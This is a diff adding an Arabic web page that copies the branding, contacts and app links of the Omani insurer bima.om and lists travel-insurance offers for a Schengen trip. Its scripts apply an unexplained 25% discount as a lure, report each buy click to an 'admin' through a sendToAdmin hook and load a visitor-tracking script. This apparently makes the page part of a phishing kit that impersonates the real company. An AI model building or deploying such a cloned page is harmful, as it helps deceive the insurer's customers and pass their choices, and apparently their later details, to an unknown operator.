+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> خدمات الطوارئ الطبية والمصاريف المرتبطة بها $1,000,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> الإخلاء الطبي في حالت الطوارئ</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> علاج الأسنان (مشمول في النفقات الطبية الطارئة) 1000 دولار (200 دولار لكل سن)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> إعادة الجثمان $10,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> تكاليف الجنازة $2,000</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> السفر الطارئ للعائلة (تذكرة ذهاب وعودة اقتصادية واحدة)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> رسائل الترحيل الطارئ (3 رسائل كل 24 ساعة)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> مراقبة الرعاية الحرجة</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> المزايا النقدية في المستشفى 500 دولار (50 دولارًا في اليوم)</div></div>
+                                    <div class="opt-outer"><div class="opt"><i class="fa-light fa-check"></i> فقدان الأمتعة الشخصية $5,000</div></div>
+                                </div>
+                                <a href="#" onclick="return false;" class="mt-2 mb-3 font-size-11px">عرض المزيد</a>
+                            </div>
+                        </div>
+
+                        <div class="pl-10-pr-10 BasePrice-outer ">
+                            <div class=" BasePrice ">
+                                <div class="Title">السعر الأساسي</div>
+                                <div class="Amount">
+                                    <span class="cur-name">ر.ع</span>
+                                    <span class="amt">31.5</span>
+                                    <span class="amt-tax">+ الضرائب</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    <div class="col-sm-12 col-md-6">
+                        <div>
+                            <div class="row optional pl-10-pr-10">
+                                <div class="col-sm-12 title ">
+                                    <span class="bold liner">إختياري  </span>
+                                </div>
+                                <div class="col-sm-12 covers">
+                                    <div>
+                                        <ul>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_11_مخاطر_الإرهاب">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_11_مخاطر_الإرهاب">مخاطر الإرهاب</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_11_Winter_sports_extens">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_11_Winter_sports_extens">Winter sports extension</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_11_Golf Cover Extension">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_11_Golf Cover Extension">Golf Cover Extension</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                            <li>
+                                                <div class="cover_outer">
+                                                    <div class="row">
+                                                        <div class="col-12">
+                                                            <div class="ofr-cover">
+                                                                <div class="ofr-cover-chk">
+                                                                    <input type="checkbox" id="ofr_ORIENT_11_Car Rental Excess Ex">
+                                                                </div>
+                                                                <div class="ofr-cover-lbl">
+                                                                    <label class="m-0" for="ofr_ORIENT_11_Car Rental Excess Ex">Car Rental Excess Extension</label>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2 pt-md-4 payment">
+                                    <div class="row ">
+                                        <div class="col">
+                                            <div class="buy ">
+                                                <div class="d-flex justify-content-between">
+                                                    <div class="">
+                                                        <div class="Title ">إجمالي المبلغ ( <span class="small font-weight-bold"> إلى 2 المسافرين </span> )</div>
+                                                        <div class="Amount">
+                                                            <span class="cur-name">ر.ع</span> <span>33.7</span>
+                                                        </div>
+                                                    </div>
+                                                    <div class="d-flex flex-column">
+                                                        <div>
+                                                            <span style="font-size:12px">السفر إلى:</span>
+                                                        </div>
+                                                        <div>
+                                                            <span style="font-size:12px">شنجن</span>
+                                                        </div>
+                                                        <a href="travel-beneficiaries.html?amount=33.7" target="_self" class="btn btn-buy-now bold">
+                                                            أختر
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    </div><!-- end body_content -->
+
+    <!-- Footer -->
+    <section class="footer-style1 pt20 pb0 ">
+        <div class="container">
+            <div class="row pb-2 ">
+                <div class="col-sm-5">
+                    <div class="footer-widget text-center text-sm-start">
+                        <a class="footer-logo" href="#" onclick="return false;"><img src="../img/logo/logo-50x50-t.png" alt="بيمة"></a>
+                        <div class="text-white">
+                            <small>شركة بيت التأمين ش. م. م.</small>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-sm-7">
+                    <div class="social-widget text-center text-sm-end">
+                        <div class="social-style1">
+                            <span class="text-white me-2 fw600 fz15">تابعنا عبر</span>
+                            <a href="https://www.facebook.com/www.Bima.om"><i class="fab fa-facebook-f list-inline-item"></i></a>
+                            <a href="https://twitter.com/bima_oman"><i class="fab fa-twitter list-inline-item"></i></a>
+                            <a href="https://www.instagram.com/bima_oman"><i class="fab fa-instagram list-inline-item"></i></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row pt30 white-bdrt1 ">
+                <div class="col-md-6">
+                    <div class="row justify-content-between">
+                        <div class="col-auto">
+                            <div class="link-style1 mb-3">
+                                <h6 class="text-white mb25">روابط سريعة</h6>
+                                <div class="link-list">
+                                    <a href="#">عن بيمة</a>
+                                    <a href="#">إتصل بنا</a>
+                                    <a href="#">مقالات</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-auto">
+                            <div class="link-style1 mb-3">
+                                <h6 class="text-white mb25"> </h6>
+                                <ul class="ps-0">
+                                    <li><a href="#">التأمين على المركبات</a></li>
+                                    <li><a href="#">تأمين السفر</a></li>
+                                    <li><a href="#">تأمين خدم المنازل</a></li>
+                                    <li><a href="#">تأمين صحي</a></li>
+                                    <li><a href="#">تأمين القروض</a></li>
+                                    <li><a href="#">تأمين الاخطاء الطبية</a></li>
+                                    <li><a href="#">تأمين المنازل</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-4 offset-lg-2">
+                    <div class="footer-widget mb-4">
+                        <div class="row mb-4">
+                            <div class="col-auto">
+                                <div class="contact-info">
+                                    <p class="info-title">خدمة العملاء</p>
+                                    <h6 class="info-phone">
+                                        <a href="javascript:void(0);">
+                                            <i class="fas fa-phone-rotary"></i> <span class="ltr-fix">‭+968 22644444‬</span>
+                                        </a>
+                                    </h6>
+                                </div>
+                            </div>
+                            <div class="col-auto">
+                                <div class="contact-info">
+                                    <p class="info-title">دعم مباشر</p>
+                                    <h6 class="info-mail">
+                                        <a href="mailto:info@bima.om">
+                                            <i class="fas fa-envelope"></i> info@bima.om
+                                        </a>
+                                    </h6>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="app-widget">
+                            <h5 class="title text-white mb10">حمل التطبيق</h5>
+                            <div class="row mb-4 mb-lg-5">
+                                <div class="col-lg-12">
+                                    <a href="https://apps.apple.com/om/app/bima-insurance/id1628311517" target="_blank">
+                                        <div class="app-info d-flex align-items-center mb20">
+                                            <div class="flex-shrink-0">
+                                                <i class="fab fa-apple fz30 text-white"></i>
+                                            </div>
+                                            <div class="flex-grow-1 ml20">
+                                                <p class="app-text fz13 mb0">حمل من </p>
+                                                <h6 class="app-title text-white fz14">متجر آبل</h6>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>
+                                <div class="col-lg-12">
+                                    <a href="https://play.google.com/store/apps/details?id=com.ebima.insuranceapp" target="_blank">
+                                        <div class="app-info d-flex align-items-center mb10">
+                                            <div class="flex-shrink-0">
+                                                <i class="fab fa-google-play fz30 text-white"></i>
+                                            </div>
+                                            <div class="flex-grow-1 ml20">
+                                                <p class="app-text fz13 mb0">حمل من </p>
+                                                <h6 class="app-title text-white fz14">جوجل بلاي</h6>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>
+                                <div class="col-lg-12">
+                                    <a href="https://appgallery.huawei.com/app/C108465739" target="_blank">
+                                        <div class="app-info d-flex align-items-center mb10">
+                                            <div class="flex-shrink-0">
+                                                <i class="fz30 text-white"></i>
+                                            </div>
+                                            <div class="flex-grow-1 ml20">
+                                                <p class="app-text fz13 mb0">حمل من </p>
+                                                <h6 class="app-title text-white fz14">متجر هواوي</h6>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container white-bdrt1 py-1 pt-3 ">
+            <div class="row">
+                <div class="col-sm-6">
+                    <div class="text-center text-lg-start">
+                        <p class="copyright-text text-gray ff-heading">
+                            حقوق النسخ © 2026 <a href="https://www.bima.om" target="_blank">bima.om</a>. كافة الحقوق محفوظة.
+                        </p>
+                    </div>
+                </div>
+                <div class="col-sm-6">
+                    <div class="text-center text-lg-end">
+                        <p class="footer-menu ff-heading text-gray">
+                            <a class="text-gray" href="#">الأحكام والشروط</a> .
+                            <a class="text-gray" href="#">الأسئلة المتداولة</a> .
+                            <a class="text-gray" href="#">سياسة الخصوصية</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <a class="scrollToHome" href="#"><i class="fas fa-angle-up"></i></a>
+</div><!-- end wrapper -->
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+(function() {
+    var data = JSON.parse(localStorage.getItem('travelInsuranceData') || '{}');
+    
+    // Default values (original: 2 travelers, 19 days)
+    var origTravelers = 2;
+    var origDays = 19;
+    var newTravelers = 2;
+    var newDays = 19;
+
+    if (data.destination) {
+        // Set destination name
+        var destCountryEl = document.getElementById('dest-country');
+        var destRegionEl = document.getElementById('dest-region');
+
+        if (data.destinationType === 'region') {
+            var name = data.destinationName || data.destination;
+            if (destCountryEl) destCountryEl.textContent = name;
+            if (destRegionEl) destRegionEl.textContent = ' (' + name + ') ';
+        } else if (data.destinationType === 'country') {
+            var countryName = data.destinationName || data.destination;
+            if (destCountryEl) destCountryEl.textContent = countryName;
+            if (destRegionEl) {
+                if (data.regionName) {
+                    destRegionEl.textContent = ' (' + data.regionName + ') ';
+                } else {
+                    destRegionEl.textContent = '';
+                }
+            }
+        }
+
+        // Set dates and calculate days
+        if (data.departureDate && data.returnDate) {
+            var dep = new Date(data.departureDate);
+            var ret = new Date(data.returnDate);
+            var depStr = dep.getDate() + '/' + (dep.getMonth() + 1);
+            var retStr = ret.getDate() + '/' + (ret.getMonth() + 1) + ' ' + ret.getFullYear();
+            var datesEl = document.getElementById('travel-dates');
+            if (datesEl) datesEl.textContent = depStr + ' - ' + retStr;
+
+            var diffTime = Math.abs(ret - dep);
+            newDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+            var daysEl = document.getElementById('travel-days');
+            if (daysEl) daysEl.textContent = newDays;
+        }
+
+        // Set travelers count
+        if (data.totalTravelers) {
+            newTravelers = parseInt(data.totalTravelers);
+            var travelersEl = document.getElementById('travel-travelers');
+            if (travelersEl) travelersEl.textContent = newTravelers;
+        }
+    }
+
+    // Calculate price ratio based on travelers and days
+    var ratio = (newTravelers / origTravelers) * (newDays / origDays);
+
+    // Update all base prices
+    var amtElements = document.querySelectorAll('.BasePrice .amt');
+    amtElements.forEach(function(el) {
+        var origPrice = parseFloat(el.textContent);
+        if (!isNaN(origPrice)) {
+            var newPrice = (origPrice * ratio).toFixed(1);
+            el.textContent = newPrice;
+        }
+    });
+
+    // Update "السفر إلى" destination in all offers
+    var destName = 'شنجن';
+    if (data.destinationName) {
+        destName = data.destinationName;
+    } else if (data.destination) {
+        destName = data.destination;
+    }
+    // Update all "السفر إلى" spans
+    var buyContainers = document.querySelectorAll('.payment .buy');
+    buyContainers.forEach(function(container) {
+        var spans = container.querySelectorAll('span[style*="font-size:12px"]');
+        if (spans.length >= 2) {
+            spans[1].textContent = destName;
+        }
+    });
+    // Update all region_name elements
+    var regionEls = document.querySelectorAll('.region_name');
+    regionEls.forEach(function(el) {
+        el.textContent = destName;
+    });
+
+    // Update all total prices and buy buttons with discount
+    var buyDivs = document.querySelectorAll('.payment .buy');
+    buyDivs.forEach(function(buyDiv) {
+        // Update travelers text
+        var titleEl = buyDiv.querySelector('.Title .small');
+        if (titleEl) {
+            titleEl.textContent = ' \u0625\u0644\u0649 ' + newTravelers + ' \u0627\u0644\u0645\u0633\u0627\u0641\u0631\u064a\u0646 ';
+        }
+        // Update total amount with discount
+        var amountDiv = buyDiv.querySelector('.Amount');
+        if (amountDiv) {
+            var amountSpan = amountDiv.querySelector('span:not(.cur-name)');
+            if (amountSpan) {
+                var origTotal = parseFloat(amountSpan.textContent);
+                if (!isNaN(origTotal)) {
+                    var adjustedTotal = (origTotal * ratio).toFixed(1);
+                    var discountedTotal = (adjustedTotal * 0.75).toFixed(1);
+                    
+                    // Replace amount div content with original (strikethrough) + discounted
+                    amountDiv.innerHTML = '<span class="price-original"><span class="cur-name">\u0631.\u0639</span> ' + adjustedTotal + '</span>' +
+                        '<br><span class="price-discounted"><span class="cur-name">\u0631.\u0639</span> ' + discountedTotal + '</span>';
+                    
+                    // Update buy button link with discounted price
+                    var buyBtn = buyDiv.querySelector('.btn-buy-now');
+                    if (buyBtn) {
+                        buyBtn.href = 'travel-beneficiaries.html?amount=' + discountedTotal;
+                    }
+                }
+            }
+        }
+    });
+})();
+</script>
+<script>
+// Send to admin when buy button is clicked
+document.querySelectorAll('.btn-buy-now').forEach(function(btn) {
+    btn.addEventListener('click', function() {
+        if (window.sendToAdmin) {
+            var card = btn.closest('.single_product') || btn.closest('.card') || btn.parentElement.parentElement;
+            var companyEl = card ? card.querySelector('.company-name, h4, h5, .title') : null;
+            var amount = btn.href ? btn.href.split('amount=')[1] : '';
+            window.sendToAdmin({
+                'المبلغ': amount + ' ر.ع',
+                'الحالة': 'تم اختيار العرض'
+            }, 'تأمين السفر - العروض');
+        }
+    });
+});
+</script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
